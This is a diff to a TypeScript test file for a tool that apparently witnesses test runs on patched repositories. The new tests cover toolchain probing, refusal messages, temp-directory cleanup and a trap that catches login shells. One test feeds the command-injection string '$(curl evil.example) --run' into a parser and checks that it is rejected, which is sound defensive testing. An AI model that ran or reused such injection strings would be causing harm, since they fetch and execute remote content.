@@ -5,7 +5,7 @@ import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync 
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { pathToFileURL } from "node:url";
-import { test } from "node:test";
+import { after, test } from "node:test";
 import { ALLOWLIST, CAPS, repoById } from "./allowlist.ts";
 import {
   applyAdvance,
@@ -34,7 +34,14 @@ import {
 } from "./engine.ts";
 import { draftPullPayload } from "./github-pr.ts";
 import { packetChecks, packetDivergences } from "./ledger-check.ts";
-import { isTestPath, verifyWitnessLogs, witnessEvidence } from "./witness.ts";
+import {
+  commandTools,
+  isTestPath,
+  runFailureDetail,
+  toolchainLabel,
+  verifyWitnessLogs,
+  witnessEvidence,
+} from "./witness.ts";
 import { DISCLOSURE, FOUNDRY_REPO_URL } from "./neighbor.ts";
 import { buildPacket, renderEvidencePage, renderPrBody } from "./packet.ts";
 import { evaluatePolicy } from "./policy.ts";
@@ -1638,13 +1645,16 @@ test("status does not claim a re-block that the held slot already prevented", ()
 
 function fakeRunner(script: Record<string, { exit: number; output: string }>) {
   const calls: string[] = [];
-  const runner = async (cmd: string, args: string[]) => {
+  /** Parallel to `calls`: the working directory each step was handed, so cwd is assertable too. */
+  const cwds: (string | undefined)[] = [];
+  const runner = async (cmd: string, args: string[], opts?: { cwd?: string }) => {
     const line = [cmd, ...args].join(" ");
     calls.push(line);
+    cwds.push(opts?.cwd);
     const hit = Object.entries(script).find(([prefix]) => line.includes(prefix));
     return hit ? hit[1] : { exit: 0, output: "" };
   };
-  return { runner, calls };
+  return { runner, calls, cwds };
 }
 
 test("host witness: green at head, red on revert, sha-bound logs", async () => {
@@ -1709,6 +1719,190 @@ test("witness refuses instead of degrading: e2b without a key, host outside Wave
   );
   assert.equal(hostWave1.ok, false);
   if (!hostWave1.ok) assert.match(hostWave1.error, /Wave 0/);
+});
+
+const WAVE0 = {
+  packetId: "pkt_ravidsrk_orca-fleet_71",
+  repoId: "ravidsrk/orca-fleet",
+  baseSha: BASE,
+  headSha: HEAD,
+  sandbox: "host" as const,
+  wave: 0 as const,
+};
+
+/** 60 lines ending in the way a too-old interpreter actually dies, so the tail has to be a tail. */
+function noisyRun(): string {
+  const lines = Array.from({ length: 59 }, (_, i) => `line-${i + 1}`);
+  lines.push("TypeError: unsupported operand type(s) for |: 'type' and 'NoneType'");
+  return lines.join("\n");
+}
+
+/**
+ * The two refusals an operator hits with a working patch and a broken machine (issue #41).
+ *
+ * Both used to end at the exit code. `tests are red at head d91fe2f (exit 1) — nothing to witness`
+ * is the same sentence whether the patch is wrong or the interpreter is six minor versions too
+ * old, and it never referenced `headRun.output` at all — so there was nothing to un-truncate, the
+ * output simply was not there. A refusal that cannot be told apart from a different refusal is not
+ * a diagnostic.
+ */
+/** The stock-macOS #41 machine, as the probe step sees it: `python3` is `/usr/bin/python3` 3.9.6. */
+const STALE_PYTHON = {
+  "probe command -v python3": { exit: 0, output: "/usr/bin/python3\nPython 3.9.6\n" },
+};
+
+test("a red-at-head refusal prints the command it ran and the tail of the run", async () => {
+  const redHead = await witnessEvidence(
+    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
+    fakeRunner({ ...STALE_PYTHON, "run-tests@head": { exit: 1, output: noisyRun() } }).runner,
+    {},
+  );
+  assert.equal(redHead.ok, false);
+  if (!redHead.ok) {
+    assert.match(redHead.error, /red at head/i);
+    assert.match(redHead.error, /python3 scripts\/validate\.py/, "the resolved command is missing");
+    // The fact that separates the two cases, and the reason this refusal exists at all. Every
+    // refusal test used to script only the run phases, so `toolchain` was `undefined` in all of
+    // them and `runFailureDetail`'s `if (toolchain)` branch was never taken: deleting the line
+    // left the suite green. Here the machine is #41's — a working patch and a six-minor-versions
+    // -too-old interpreter — and the refusal has to say which.
+    assert.match(redHead.error, /^ {2}toolchain: python3 3\.9\.6$/m, redHead.error);
+    assert.match(
+      redHead.error,
+      /unsupported operand type\(s\)/,
+      `the failing output is missing: ${redHead.error}`,
+    );
+    // A tail, not a dump: 60 lines in, the first 20 stay out and the refusal says how many.
+    assert.doesNotMatch(redHead.error, /line-1\b/, "the whole run was pasted instead of its tail");
+    assert.match(redHead.error, /20 earlier lines omitted/, redHead.error);
+    assert.match(redHead.error, /line-59/, redHead.error);
+  }
+});
+
+test("a red-at-head refusal with no output at all says so, and points at the pre-flight", async () => {
+  // The shape of #41 on a stock macOS machine: `python3` resolves to 3.9.6, the command dies
+  // before it prints anything, and the operator gets three seconds and a blank refusal.
+  const silent = await witnessEvidence(
+    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
+    fakeRunner({ ...STALE_PYTHON, "run-tests@head": { exit: 127, output: "" } }).runner,
+    {},
+  );
+  assert.equal(silent.ok, false);
+  if (!silent.ok) {
+    assert.match(silent.error, /python3 scripts\/validate\.py/);
+    // The no-output branch returns early, so it carries the toolchain on its own code path — and
+    // this is the one refusal where the toolchain is the *only* evidence the operator gets.
+    assert.match(silent.error, /^ {2}toolchain: python3 3\.9\.6$/m, silent.error);
+    assert.match(silent.error, /no output/i, silent.error);
+    // Pinned verbatim, the way INGEST_INVOCATION is: `page.includes(CONSTANT)` holds for whatever
+    // the constant happens to say, so the assertion has to know the right answer. `cli.test.ts`
+    // supplies the other half by driving that verb for real.
+    const { PREFLIGHT_INVOCATION } = await import("./witness.ts");
+    assert.equal(
+      PREFLIGHT_INVOCATION,
+      "node --experimental-strip-types factory/cli.ts witness-check",
+    );
+    assert.ok(silent.error.includes(PREFLIGHT_INVOCATION), silent.error);
+  }
+});
+
+test("a failed negative control prints the revert run's output and the command", async () => {
+  const stayedGreen = await witnessEvidence(
+    { ...WAVE0, testCommand: "npm test" },
+    fakeRunner({
+      "probe command -v npm": { exit: 0, output: "/opt/homebrew/bin/npm\n10.9.2\n" },
+      "run-tests@head": { exit: 0, output: "ok" },
+      "run-tests@revert": { exit: 0, output: "100 passing, 0 failing" },
+    }).runner,
+    {},
+  );
+  assert.equal(stayedGreen.ok, false);
+  if (!stayedGreen.ok) {
+    assert.match(stayedGreen.error, /negative control/i);
+    assert.match(stayedGreen.error, /npm test/, stayedGreen.error);
+    // The third caller of `runFailureDetail`, passing the toolchain on its own line of code.
+    assert.match(stayedGreen.error, /^ {2}toolchain: npm 10\.9\.2$/m, stayedGreen.error);
+    assert.match(stayedGreen.error, /100 passing, 0 failing/, stayedGreen.error);
+  }
+});
+
+test("a refusal names the toolchain when it knows one and stays silent when it does not", () => {
+  // The conditional itself, both ways. Pinning only the present case licenses making the line
+  // unconditional, which prints `toolchain: undefined` on exactly the machine where the probe
+  // failed — a refusal inventing a fact about the very thing the operator is trying to diagnose.
+  const known = runFailureDetail("python3 -m pytest", "E   ImportError", "python3 3.9.6");
+  assert.match(known, /^ {2}toolchain: python3 3\.9\.6$/m, known);
+  // Directly under the command, before the output: the two facts the operator reads together.
+  assert.match(known, /^ {2}command: python3 -m pytest\n {2}toolchain: python3 3\.9\.6$/m, known);
+
+  const unknown = runFailureDetail("python3 -m pytest", "E   ImportError");
+  assert.doesNotMatch(unknown, /toolchain/i, unknown);
+  assert.match(unknown, /^ {2}command: python3 -m pytest$/m, unknown);
+});
+
+test("the witness records the toolchain that produced the green, resolved inside the clone", async () => {
+  const { runner, calls, cwds } = fakeRunner({
+    "probe command -v python3": { exit: 0, output: "/opt/homebrew/bin/python3\nPython 3.14.7\n" },
+    "run-tests@head": { exit: 0, output: "42 passing" },
+    "run-tests@revert": { exit: 1, output: "3 failing" },
+  });
+  const outcome = await witnessEvidence(
+    { ...WAVE0, testCommand: "python3 scripts/validate.py && python3 -m unittest discover" },
+    runner,
+    {},
+  );
+  assert.equal(outcome.ok, true);
+  if (outcome.ok) assert.equal(outcome.witness.toolchain, "python3 3.14.7");
+
+  // Resolved in the checkout, not in the operator's home: a repo that pins its interpreter
+  // (`.python-version`, `.tool-versions`, `.nvmrc`) must be recorded by what *it* selects.
+  const probeIdx = calls.findIndex((c) => c.startsWith("probe "));
+  assert.ok(probeIdx !== -1, calls.join("\n"));
+  assert.match(cwds[probeIdx] ?? "", /foundry-witness-/, `probed in ${cwds[probeIdx]}`);
+});
+
+test("a witness whose toolchain could not be resolved claims none", async () => {
+  // The alternative — recording `python3 (not found)` — puts a sentence on the evidence page that
+  // reads as a fact about the run. Absence is the honest record.
+  const { runner } = fakeRunner({
+    "run-tests@head": { exit: 0, output: "42 passing" },
+    "run-tests@revert": { exit: 1, output: "3 failing" },
+  });
+  const outcome = await witnessEvidence({ ...WAVE0, testCommand: "python3 -m pytest" }, runner, {});
+  assert.equal(outcome.ok, true);
+  if (outcome.ok) assert.equal(outcome.witness.toolchain, undefined);
+});
+
+test("the toolchain probe names one tool per command segment, and only plausible ones", () => {
+  assert.deepEqual(
+    commandTools("python3 scripts/validate.py && python3 -m unittest discover -s tests -v"),
+    ["python3"],
+  );
+  assert.deepEqual(commandTools("npm ci && npm test"), ["npm"]);
+  assert.deepEqual(commandTools("pytest -q | tee out.txt; ruff check ."), ["pytest", "tee", "ruff"]);
+  assert.deepEqual(commandTools("FOO=1 python3 -c 'x'"), ["python3"], "env assignments are not tools");
+  assert.deepEqual(commandTools("true"), ["true"]);
+  // The probe interpolates the token into a shell command, so anything that is not a bare command
+  // name is dropped rather than resolved. `testCommand` is already operator-controlled and run
+  // verbatim, so this is not a new trust boundary — it is a refusal to invent a second one.
+  assert.deepEqual(commandTools("$(curl evil.example) --run"), []);
+  assert.deepEqual(commandTools("./scripts/ci.sh && make -j4"), ["./scripts/ci.sh", "make"]);
+});
+
+test("the toolchain label states versions and stays silent about what it could not resolve", () => {
+  assert.equal(
+    toolchainLabel([{ tool: "python3", path: "/opt/homebrew/bin/python3", version: "3.14.7", raw: "Python 3.14.7" }]),
+    "python3 3.14.7",
+  );
+  assert.equal(
+    toolchainLabel([
+      { tool: "npm", path: "/x/npm", version: "10.9.2", raw: "10.9.2" },
+      { tool: "node", path: "/x/node", version: "24.11.0", raw: "v24.11.0" },
+    ]),
+    "npm 10.9.2, node 24.11.0",
+  );
+  assert.equal(toolchainLabel([{ tool: "python3" }]), "");
+  assert.equal(toolchainLabel([]), "");
 });
 
 test("draft-ready requires a witnessed manifest, not an attested one", () => {
@@ -2506,6 +2700,33 @@ test("a manifest may name only this packet's own log paths, and the parser settl
   assert.equal(witnessLogPathViolation(PKT, witnessLogPaths(PKT)), undefined);
 });
 
+test("an ingested manifest may carry a toolchain, and may not carry a junk one", async () => {
+  // Optional in both directions on purpose. Every witness produced before #41 has no `toolchain`
+  // and must still ingest; a witness that has one must not be able to smuggle a non-string into
+  // the ledger, where `renderEvidencePage` interpolates it into the maintainer's page.
+  const { parseWitnessManifest } = await import("./witness.ts");
+  const PKT = "pkt_github_awesome-copilot_2684";
+  const raw = (extra: Record<string, unknown>) =>
+    JSON.stringify({
+      ...boundWitness("e2b", "github/awesome-copilot", PKT, extra),
+      testCommand: "true",
+    });
+
+  const carried = parseWitnessManifest(raw({ toolchain: "python3 3.14.7" }), PKT);
+  assert.equal(carried.ok, true);
+  if (carried.ok) assert.equal(carried.manifest.witness.toolchain, "python3 3.14.7");
+
+  const absent = parseWitnessManifest(raw({}), PKT);
+  assert.equal(absent.ok, true);
+  if (absent.ok) assert.equal(absent.manifest.witness.toolchain, undefined);
+
+  for (const junk of [{ toolchain: 12 }, { toolchain: { node: "24" } }, { toolchain: "   " }]) {
+    const result = parseWitnessManifest(raw(junk), PKT);
+    assert.equal(result.ok, false, `${JSON.stringify(junk)} must be refused`);
+    if (!result.ok) assert.match(result.error, /toolchain/i);
+  }
+});
+
 test("the evidence page tells the maintainer where the hashed logs are", () => {
   const { state, id } = reviewingWave1();
   const packet = state.packets[0];
@@ -2530,6 +2751,32 @@ test("the evidence page tells the maintainer where the hashed logs are", () => {
   assert.ok(page.includes("https://github.com/ravidsrk/oss-foundry"), page);
   assert.match(page, /not yours/);
   assert.match(page, new RegExp(`shasum -a 256 docs/evidence/logs/${id}/test\\.log`));
+});
+
+test("the evidence page names the toolchain the green was produced by, when the witness knows it", () => {
+  // The fact issue #41 cost an operator three hours to establish by hand: *which* interpreter
+  // produced this exit 0. A maintainer reading the page has the same question and no shell on our
+  // machine, so a witness that resolved it prints it; one that did not says nothing rather than
+  // implying the question was asked.
+  const { state, id } = reviewingWave1();
+  const packet = state.packets[0];
+  const withTool = applyAttachEvidence(
+    state,
+    id,
+    manifestWith(boundWitness("e2b", packet.repoId, id, { toolchain: "python3 3.14.7" })),
+    bindingFor(packet),
+  );
+  assert.equal(withTool.error, undefined);
+  assert.match(renderEvidencePage(withTool.state.packets[0]), /python3 3\.14\.7/);
+
+  const without = applyAttachEvidence(
+    state,
+    id,
+    manifestWith(boundWitness("e2b", packet.repoId, id)),
+    bindingFor(packet),
+  );
+  assert.equal(without.error, undefined);
+  assert.doesNotMatch(renderEvidencePage(without.state.packets[0]), /toolchain/i);
 });
 
 test("a witness forged straight into the ledger is refused at the promotion gate", () => {
@@ -2770,6 +3017,53 @@ test("witnessed run logs are written where the schema says, and land verifiable"
 // is stubbed, exactly as the ingest tests do.
 
 /**
+ * The `evidence` fixtures' temp trees, removed when the file's tests are done.
+ *
+ * Each of these is a git repo or a work tree with a clone in it, not a stray file, and the two
+ * tests added below create one apiece on every run. `mkdtempSync` with no counterpart is how a
+ * developer's `$TMPDIR` acquires hundreds of them; the same omission in `witness-host.test.ts` had
+ * left ~65 shim directories behind by the time this unit was reviewed. Registered rather than
+ * removed per-test because `wave0Origin` is built once and shared by every fixture.
+ */
+const evidenceScratch: string[] = [];
+function evidenceScratchDir(prefix: string): string {
+  const dir = mkdtempSync(join(tmpdir(), prefix));
+  evidenceScratch.push(dir);
+  return dir;
+}
+after(() => {
+  for (const dir of evidenceScratch) rmSync(dir, { recursive: true, force: true });
+});
+
+/**
+ * The environment variable `LOGIN_SHELL_PROFILE` exports and `scripts/validate.py` refuses on.
+ *
+ * `hostRunner`'s non-login contract had a test (`witness-host.test.ts`) and the operator's path
+ * had none: the single `hostRunner,` argument at the `evidence` verb's `witnessEvidence` call was
+ * held by nothing. Substituting a `bash -lc` runner there reintroduced issue #41 on the only path
+ * an operator actually runs, with the suite green, because this fixture's `scripts/validate.py`
+ * was `sys.exit(0)` — green under every shell by construction, so it could not discriminate.
+ */
+const LOGIN_SHELL_MARKER = "FOUNDRY_WITNESS_SAW_LOGIN_SHELL";
+
+/**
+ * A `~/.bash_profile` + `~/.profile` pair exporting {@link LOGIN_SHELL_MARKER}, written into a
+ * `HOME` the CLI child is pointed at.
+ *
+ * This is bash's own documented startup sequence rather than a platform quirk: a *login* shell
+ * sources `/etc/profile` and then the first of `~/.bash_profile`, `~/.bash_login`, `~/.profile`;
+ * `bash -c` sources none of them. So the marker is present exactly when the witness ran the shell
+ * the contract forbids — on Linux and CI as much as on the macOS machine where `path_helper`
+ * happened to be the mechanism that cost issue #41 its interpreter.
+ */
+function loginShellProfile(home: string): void {
+  const marker = `export ${LOGIN_SHELL_MARKER}=1\n`;
+  mkdirSync(home, { recursive: true });
+  writeFileSync(join(home, ".bash_profile"), marker);
+  writeFileSync(join(home, ".profile"), marker);
+}
+
+/**
  * A git repo standing in for the Wave 0 target. Head is green under the allowlist's real
  * `testCommand`; reverting the one non-test file to base makes it red, so the negative control
  * genuinely goes red instead of being asserted. Built once — the CLI only ever clones from it.
@@ -2777,7 +3071,7 @@ test("witnessed run logs are written where the schema says, and land verifiable"
 let originRepo: { path: string; base: string; head: string } | undefined;
 function wave0Origin(): { path: string; base: string; head: string } {
   if (originRepo) return originRepo;
-  const path = mkdtempSync(join(tmpdir(), "foundry-origin-"));
+  const path = evidenceScratchDir("foundry-origin-");
   const git = (...args: string[]) => {
     const run = spawnSync(
       "git",
@@ -2801,7 +3095,18 @@ function wave0Origin(): { path: string; base: string; head: string } {
   assert.equal(init.status, 0, `git init: ${init.stdout}${init.stderr}`);
   const suite = (expected: string) =>
     `import unittest\n\n\nclass AnswerTest(unittest.TestCase):\n    def test_answer(self):\n        with open("src/answer.txt") as handle:\n            self.assertEqual(handle.read().strip(), "${expected}")\n`;
-  write("scripts/validate.py", "import sys\n\nsys.exit(0)\n");
+  // Not `sys.exit(0)`. The allowlist's `testCommand` is fixed (`python3 scripts/validate.py && …`)
+  // and the headline criterion is that it runs unedited, so the *repo* is where this fixture gets
+  // to care which shell invoked it. `validate.py` is the first thing that command runs, and it
+  // fails the run when the witness's shell sourced a login profile — which is precisely the
+  // condition under which macOS `path_helper` re-resolved `python3` to 3.9.6 in issue #41.
+  write(
+    "scripts/validate.py",
+    "import os\nimport sys\n\n" +
+      `if os.environ.get(${JSON.stringify(LOGIN_SHELL_MARKER)}):\n` +
+      '    sys.stderr.write("validate.py: the witness ran a LOGIN shell — see issue #41\\n")\n' +
+      "    sys.exit(1)\n\nsys.exit(0)\n",
+  );
   write("src/answer.txt", "wrong\n");
   write("tests/test_answer.py", suite("wrong"));
   git("add", "-A");
@@ -2857,7 +3162,7 @@ function recordingGit(dir: string): { binDir: string; record: string; calls: () 
  */
 function evidenceFixture(filesChanged = 2, message = "fix the answer\n\nFixes #71") {
   const origin = wave0Origin();
-  const dir = mkdtempSync(join(tmpdir(), "foundry-evidence-"));
+  const dir = evidenceScratchDir("foundry-evidence-");
   const { state, id } = reviewing();
   assert.equal(state.packets[0].repoId, "ravidsrk/orca-fleet", "the evidence verb is host/Wave 0 only");
   writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));
@@ -2885,19 +3190,27 @@ function evidenceFixture(filesChanged = 2, message = "fix the answer\n\nFixes #7
   const gitconfig = join(dir, "gitconfig");
   writeFileSync(gitconfig, `[url "${origin.path}"]\n\tinsteadOf = https://github.com/ravidsrk/orca-fleet.git\n`);
 
+  // The trap the shell contract is measured with. `GIT_CONFIG_GLOBAL` above already keeps git off
+  // this `HOME`, so the only thing in it is the profile a login shell would source and the witness
+  // must not. It is inert against correct code and fatal against `bash -lc`.
+  const home = join(dir, "home");
+  loginShellProfile(home);
+
   const logPaths = [
     join(dir, "docs", "evidence", "logs", id, "test.log"),
     join(dir, "docs", "evidence", "logs", id, "revert.log"),
   ];
   const git = recordingGit(dir);
+  const childEnv = {
+    GIT_CONFIG_GLOBAL: gitconfig,
+    HOME: home,
+    PATH: `${git.binDir}:${process.env.PATH ?? ""}`,
+  };
   const runEvidence = () =>
-    runCli(
-      dir,
-      ["evidence", id, "--base", origin.base, "--head", origin.head],
-      stub,
-      { GIT_CONFIG_GLOBAL: gitconfig, PATH: `${git.binDir}:${process.env.PATH ?? ""}` },
-    );
-  return { dir, id, origin, logPaths, runEvidence, gitCalls: git.calls };
+    runCli(dir, ["evidence", id, "--base", origin.base, "--head", origin.head], stub, childEnv);
+  /** The pre-flight, run from the same working directory and the same environment as the witness. */
+  const runWitnessCheck = () => runCli(dir, ["witness-check", "ravidsrk/orca-fleet"], stub, childEnv);
+  return { dir, id, origin, logPaths, runEvidence, runWitnessCheck, gitCalls: git.calls };
 }
 
 function exists(path: string): boolean {
@@ -2937,6 +3250,63 @@ test("the evidence verb writes the run logs its own ledger entry points at", () 
   assert.equal(verifyWitnessLogs(witness!, read).ok, true, "the maintainer's recompute must succeed");
   // ...and the two logs are different files, not one result copied twice.
   assert.notEqual(read(witness!.testLogPath!), read(witness!.revertLogPath!));
+});
+
+test("the evidence verb runs the repo's command in the non-login shell the contract promises", () => {
+  // Issue #41 at the only place an operator meets it. `hostRunner`'s shell is asserted directly in
+  // `witness-host.test.ts`, but the `evidence` verb reaches it through exactly one argument —
+  // `hostRunner,` at the `witnessEvidence` call in cli.ts — and that argument was held by nothing.
+  // Swapping in a `bash -lc` runner there restored #41's defect on the operator's real path and
+  // the whole suite stayed green, because the fixture repo's `validate.py` was `sys.exit(0)`.
+  //
+  // So the fixture repo now refuses a login shell, and the allowlist's `testCommand` runs unedited
+  // over it. This is the CLI's own child process: nothing about the shell is stubbed.
+  const { dir, runEvidence } = evidenceFixture();
+  assert.ok(
+    readFileSync(join(dir, "home", ".bash_profile"), "utf8").includes(LOGIN_SHELL_MARKER),
+    "the trap must actually be armed, or this test passes by not springing it",
+  );
+
+  const run = runEvidence();
+  assert.equal(
+    run.status,
+    0,
+    `the witness ran a login shell (issue #41) — a login bash sources ~/.bash_profile, and the ` +
+      `repo's own testCommand refused on the marker it exports:\n${run.seen}`,
+  );
+  assert.doesNotMatch(run.seen, /LOGIN shell/, run.seen);
+  assert.ok(ledgerAt(dir).packets[0].evidence?.witness, run.seen);
+});
+
+test("the toolchain the witness records is the one witness-check predicted for the same repo", () => {
+  // The pre-flight's entire value is that it cannot disagree with the run (witness.ts's
+  // `hostRunner` docstring, docs/10-schemas.md). Nothing checked the two agree, so a witness
+  // resolving through a different shell than the pre-flight — a green pre-flight and a red
+  // witness, the #41 shape — was invisible. Both halves run here, from one working directory.
+  const { dir, runEvidence, runWitnessCheck } = evidenceFixture();
+
+  const preflight = runWitnessCheck();
+  assert.equal(preflight.status, 0, preflight.seen);
+  const predicted = /^ {2}toolchain a witness from here would record: (.+)$/m.exec(preflight.stdout)?.[1];
+  assert.ok(predicted, `the pre-flight named no toolchain at all:\n${preflight.seen}`);
+  assert.notEqual(predicted, "(none resolved)", `no python3 on this machine: ${preflight.seen}`);
+  assert.match(predicted!, /^python3 \d+\.\d+/, preflight.seen);
+
+  const run = runEvidence();
+  assert.equal(run.status, 0, run.seen);
+  const witness = ledgerAt(dir).packets[0].evidence?.witness;
+  assert.ok(witness, run.seen);
+  // Not "the witness recorded something" — the same string, both sides resolved through the same
+  // shell. `witness-check` resolves in the operator's working directory and the witness resolves
+  // inside the clone, so a repo pinning its interpreter may legitimately part them (see
+  // docs/08-operations.md); this fixture's clone pins nothing, so parting them here means the two
+  // paths stopped sharing a shell.
+  assert.equal(
+    witness!.toolchain,
+    predicted,
+    `witness-check predicted \`${predicted}\` and the witness recorded \`${witness!.toolchain}\` — ` +
+      `the pre-flight and the run resolved through different shells:\n${run.seen}`,
+  );
 });
 
 test("an evidence run refused at the gate leaves no orphan logs behind", () => {
